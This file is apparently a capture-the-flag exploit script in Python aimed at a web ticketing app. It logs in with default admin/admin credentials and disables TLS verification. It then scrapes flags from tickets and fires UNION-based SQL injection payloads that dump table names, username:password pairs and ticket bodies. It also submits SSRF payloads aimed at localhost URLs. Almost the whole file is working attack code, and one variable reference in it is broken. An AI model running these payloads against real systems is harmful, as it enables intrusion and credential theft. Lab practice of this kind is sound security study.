import urllib.request as u,urllib.parse as p,ssl,re,sys,json,http.cookiejar as cj
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=False

def probe(B):
    results=[]
    jar=cj.CookieJar();op=u.build_opener(u.HTTPCookieProcessor(jar),u.HTTPSHandler(context=ctx))

    # Login - follow redirects
    for user,pw in [("admin","admin")]:
        try:
            data=p.urlencode({"username":user,"password":pw}).encode()
            r=op.open(u.Request(f"{B}/login",data=data),timeout=8)
            body=r.read().decode()
            url=r.geturl()
            results.append({"type":"Login","url":url,"status":r.status})

            # Check if we're logged in - look for admin link or ticket links
            if "/admin" in url or "admin" in body.lower():
                results.append({"type":"Auth","ok":True,"body_preview":body[:300]})

                # Now scan for tickets
                for page in ["/admin","/","/index"]:
                    try:
                        r2=op.open(f"{B}{page}",timeout=5)
                        b2=r2.read().decode()
                        tids=re.findall(r"ticket\?id=(\d+)",b2)
                        if tids:
                            results.append({"type":"Tickets","page":page,"ids":tids})
                            # Read each ticket
                            for tid in tids:
                                r3=op.open(f"{B}/ticket?id={tid}",timeout=5)
                                b3=r3.read().decode()
                                flags=re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$",b3)
                                if flags:results.append({"type":"FLAG","ticket":tid,"flag":flags[0]})
                                reply=re.findall(r"Our Reply</h2>\s*<pre>(.*?)</pre>",b3,re.DOTALL)
                                if reply and "No reply" not in reply[0]:results.append({"type":"Reply","ticket":tid,"text":reply[0][:300]})
                        break
                    except:pass

                # Try SQLi on ticket
                for pl in ["-1 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables--",
                           "-1 UNION SELECT group_concat(username,CHAR(58),password),2,3 FROM users--",
                           "-1 UNION SELECT group_concat(id,CHAR(58),title,CHAR(58),body,CHAR(58),reply),2,3 FROM tickets--"]:
                    try:
                        r3=op.open(f"{B}/ticket?id={u.quote(pl)}",timeout=8)
                        b3=r3.read().decode()
                        title=re.findall(r"<h1>(.*?)</h1>",b3)
                        if title and title[0]:results.append({"type":"SQLi","payload":pl[:50],"data":title[0][:300]})
                        flags=re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$",b3)
                        if flags:results.append({"type":"FLAG-SQLi","flag":flags[0]})
                    except:pass

                # Try SSRF/LFI via newTicket body
                for local_url in ["http://127.0.0.1:8080/flag","http://localhost/admin","http://127.0.0.1/"]:
                    try:
                        data3=p.urlencode({"title":f"scan{local_urls.index(local_url) if 'local_urls' in dir() else hash(local_url)%100}","body":local_url}).encode()
                        op.open(u.Request(f"{B}/newTicket",data=data3),timeout=8)
                    except:pass
                results.append({"type":"SSRF","note":"Bot payloads sent"})
                break
        except Exception as e:
            results.append({"type":"LoginErr","error":str(e)[:100]})

    # Check ticket replies for flags
    try:
        r_last=op.open(f"{B}/admin",timeout=5)
        b_last=r_last.read().decode()
        tids=re.findall(r"ticket\?id=(\d+)",b_last)
        results.append({"type":"FinalTickets","count":len(tids),"ids":tids})
        for tid in tids:
            r_t=op.open(f"{B}/ticket?id={tid}",timeout=5)
            b_t=r_t.read().decode()
            flags=re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$",b_t)
            if flags:results.append({"type":"FLAG-FINAL","ticket":tid,"flag":flags[0]})
            reply=re.findall(r"Our Reply</h2>\s*<pre>(.*?)</pre>",b_t,re.DOTALL)
            if reply and len(reply[0].strip())>10 and "No reply" not in reply[0]:
                results.append({"type":"ReplyFinal","ticket":tid,"text":reply[0][:300]})
    except:pass

    return results

r=probe(sys.argv[1])
print(json.dumps(r,ensure_ascii=False,indent=2))
